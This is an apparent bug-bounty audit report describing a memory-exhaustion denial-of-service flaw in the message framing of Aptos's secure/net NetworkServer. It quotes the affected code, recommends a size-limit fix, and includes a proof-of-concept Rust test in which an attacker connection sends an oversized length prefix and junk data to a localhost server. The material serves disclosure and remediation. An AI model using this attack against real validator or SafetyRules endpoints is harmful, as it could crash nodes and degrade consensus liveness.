# Audit Report

## Title
Unbounded Memory Exhaustion in NetworkStream via Malicious Message Size Prefix

## Summary
The `NetworkStream::read_buffer()` function in `secure/net/src/lib.rs` lacks validation on the message size field, allowing an attacker to declare arbitrarily large message sizes (up to 4GB). This causes unbounded growth of the internal buffer during message reception, enabling memory exhaustion attacks against services using `NetworkServer`, including the consensus-critical SafetyRules service in non-mainnet deployments.

## Finding Description
The vulnerability exists in the message framing protocol used by `NetworkStream`. Messages are length-prefixed with a 4-byte little-endian integer indicating the payload size. [1](#0-0) 

The `read_buffer()` function reads this size value at line 486 without any validation beyond checking if enough data has arrived. When a malicious client sends an extremely large size value (e.g., 2GB = `0x7FFFFFFF`), the server enters a loop continuously buffering incoming data until the declared size is reached. [2](#0-1) 

The attack flow is:
1. Attacker connects to a `NetworkServer` instance (e.g., SafetyRules in Process/Thread mode)
2. Sends 4 bytes: `[0xFF, 0xFF, 0xFF, 0x7F]` (2,147,483,647 bytes ≈ 2GB)
3. `read_buffer()` parses `data_size = 2,147,483,647` without validation
4. Check at line 489 fails (0 bytes received < 2GB), returns empty vector
5. `read()` loop at line 443 continuously extends `self.buffer` with incoming data chunks (1024 bytes each)
6. `self.buffer` grows unboundedly as attacker streams megabytes of garbage data
7. Memory exhaustion occurs before the full 2GB message arrives

**Broken Invariant:** Resource Limits (#9) - "All operations must respect gas, storage, and computational limits" - the network layer should enforce reasonable message size limits.

The SafetyRules service uses this vulnerable networking layer: [3](#0-2) 

In contrast, the gRPC-based alternative implements proper size limits: [4](#0-3) 

## Impact Explanation
**Severity: HIGH** (per Aptos Bug Bounty criteria)

This vulnerability enables:
- **Validator node slowdowns**: Memory exhaustion degrades node performance
- **API crashes**: Out-of-memory conditions crash the service
- **Consensus liveness degradation**: If SafetyRules crashes, the validator cannot participate in consensus

While production mainnet validators use `SafetyRulesService::Local` (which doesn't use networking) per configuration requirements [5](#0-4) , this vulnerability affects:
- **Testnet/devnet validators** using Process/Thread service modes
- **Misconfigured production nodes** 
- **Development/testing environments**

The attack requires minimal resources (few megabytes of data) to cause gigabyte-scale memory allocation on the victim.

## Likelihood Explanation
**Likelihood: MEDIUM-LOW**

- **Attack Complexity**: Very low - attacker needs only basic TCP socket programming
- **Prerequisites**: Network access to the SafetyRules service endpoint
- **Mitigating Factors**: 
  - Mainnet validators should use Local service mode (no network exposure)
  - SafetyRules typically listens on localhost or private networks
  - However, misconfiguration or testnet deployments remain vulnerable

The vulnerability is trivial to exploit once network access is achieved, but the service should not be exposed to untrusted networks in production.

## Recommendation
Add a maximum message size constant and validate the declared size before buffering:

```rust
const MAX_MESSAGE_SIZE: usize = 80 * 1024 * 1024; // 80MB (matching gRPC limit)

fn read_buffer(&mut self) -> Result<Vec<u8>, Error> {
    if self.buffer.len() < 4 {
        return Ok(Vec::new());
    }

    let mut u32_bytes = [0; 4];
    u32_bytes.copy_from_slice(&self.buffer[..4]);
    let data_size = u32::from_le_bytes(u32_bytes) as usize;

    // Validate message size before buffering
    if data_size > MAX_MESSAGE_SIZE {
        return Err(Error::DataTooLarge(data_size));
    }

    let remaining_data = &self.buffer[4..];
    if remaining_data.len() < data_size {
        return Ok(Vec::new());
    }

    let returnable_data = remaining_data[..data_size].to_vec();
    self.buffer = remaining_data[data_size..].to_vec();
    Ok(returnable_data)
}
```

Additionally:
1. Update `read()` to propagate errors instead of just checking `is_empty()`
2. Add telemetry for rejected oversized messages
3. Document the maximum message size in the module documentation
4. Audit all usages of `NetworkServer` to ensure none are exposed to untrusted networks

## Proof of Concept

```rust
#[cfg(test)]
mod exploit_test {
    use super::*;
    use std::net::{IpAddr, Ipv4Addr, SocketAddr};
    use std::thread;
    use std::io::Write;

    #[test]
    fn test_memory_exhaustion_via_malicious_size() {
        let server_port = aptos_config::utils::get_available_port();
        let server_addr = SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), server_port);
        
        // Start a NetworkServer in a separate thread
        let mut server = NetworkServer::new("exploit_test".to_string(), server_addr, 5000);
        let server_thread = thread::spawn(move || {
            // This will hang trying to buffer a huge message
            let result = server.read();
            result
        });

        // Give server time to start listening
        thread::sleep(std::time::Duration::from_millis(100));

        // Attacker connects and sends malicious size prefix
        let mut attacker_stream = std::net::TcpStream::connect(server_addr).unwrap();
        attacker_stream.set_nodelay(true).unwrap();
        
        // Send size prefix claiming 100MB message
        let malicious_size: u32 = 100 * 1024 * 1024;
        attacker_stream.write_all(&malicious_size.to_le_bytes()).unwrap();
        
        // Send only 10MB of actual data to demonstrate partial buffering
        let junk_data = vec![0u8; 1024 * 1024]; // 1MB chunks
        for _ in 0..10 {
            attacker_stream.write_all(&junk_data).unwrap();
            thread::sleep(std::time::Duration::from_millis(100));
        }
        
        // Server is now stuck with 10MB+ buffered in self.buffer,
        // waiting for remaining 90MB that will never arrive
        // In a real attack, this would continue until OOM
        
        drop(attacker_stream);
        
        // Server will eventually timeout or error when connection closes
        let result = server_thread.join();
        assert!(result.is_ok()); // Will timeout or see RemoteStreamClosed
    }
}
```

## Notes
- The line number in the security question (494) refers to the buffer reallocation, but the vulnerability manifests during the buffering phase at line 443 before that allocation occurs
- The write side has proper validation preventing messages >= u32::MAX bytes, but the read side lacks corresponding protection
- Modern deployments should prefer the gRPC-based `NetworkController` which has proper size limits (80MB) rather than the legacy TCP-based `NetworkClient/NetworkServer`

### Citations

**File:** secure/net/src/lib.rs (L430-451)
```rust
    pub fn read(&mut self) -> Result<Vec<u8>, Error> {
        let result = self.read_buffer();
        if !result.is_empty() {
            return Ok(result);
        }

        loop {
            trace!("Attempting to read from stream");
            let read = self.stream.read(&mut self.temp_buffer)?;
            trace!("Read {} bytes from stream", read);
            if read == 0 {
                return Err(Error::RemoteStreamClosed);
            }
            self.buffer.extend(self.temp_buffer[..read].to_vec());
            let result = self.read_buffer();
            if !result.is_empty() {
                trace!("Found a message in the stream");
                return Ok(result);
            }
            trace!("Did not find a message yet, reading again");
        }
    }
```

**File:** secure/net/src/lib.rs (L479-496)
```rust
    fn read_buffer(&mut self) -> Vec<u8> {
        if self.buffer.len() < 4 {
            return Vec::new();
        }

        let mut u32_bytes = [0; 4];
        u32_bytes.copy_from_slice(&self.buffer[..4]);
        let data_size = u32::from_le_bytes(u32_bytes) as usize;

        let remaining_data = &self.buffer[4..];
        if remaining_data.len() < data_size {
            return Vec::new();
        }

        let returnable_data = remaining_data[..data_size].to_vec();
        self.buffer = remaining_data[data_size..].to_vec();
        returnable_data
    }
```

**File:** consensus/safety-rules/src/remote_service.rs (L30-55)
```rust
pub fn execute(storage: PersistentSafetyStorage, listen_addr: SocketAddr, network_timeout_ms: u64) {
    let mut safety_rules = SafetyRules::new(storage, false);
    if let Err(e) = safety_rules.consensus_state() {
        warn!("Unable to print consensus state: {}", e);
    }

    let mut serializer_service = SerializerService::new(safety_rules);
    let mut network_server =
        NetworkServer::new("safety-rules".to_string(), listen_addr, network_timeout_ms);

    loop {
        if let Err(e) = process_one_message(&mut network_server, &mut serializer_service) {
            warn!("Failed to process message: {}", e);
        }
    }
}

fn process_one_message(
    network_server: &mut NetworkServer,
    serializer_service: &mut SerializerService,
) -> Result<(), Error> {
    let request = network_server.read()?;
    let response = serializer_service.handle_message(request)?;
    network_server.write(&response)?;
    Ok(())
}
```

**File:** secure/net/src/grpc_network_service/mod.rs (L23-23)
```rust
const MAX_MESSAGE_SIZE: usize = 1024 * 1024 * 80;
```

**File:** config/src/config/safety_rules_config.rs (L98-104)
```rust
            // Verify that the safety rules service is set to local for optimal performance
            if chain_id.is_mainnet() && !safety_rules_config.service.is_local() {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    format!("The safety rules service should be set to local in mainnet for optimal performance! Given config: {:?}", &safety_rules_config.service)
                ));
            }
```
